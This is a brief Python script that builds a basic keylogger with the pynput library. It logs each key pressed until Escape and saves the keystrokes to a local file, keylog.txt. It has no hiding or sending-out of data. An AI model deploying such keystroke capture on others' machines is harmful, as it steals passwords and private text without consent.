from pynput import keyboard

log = "" # initialize empty string to store key presses

def on_press(key):
    global log
    try:
        log += str(key.char) # add the character to the log
    except AttributeError:
        log += f"{key} " # add the key to the log (if not a character)

def on_release(key):
    if key == keyboard.Key.esc: # exit program if the escape key is pressed
        return False

# start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# write the log to a file
with open("keylog.txt", "w") as file:
    file.write(log)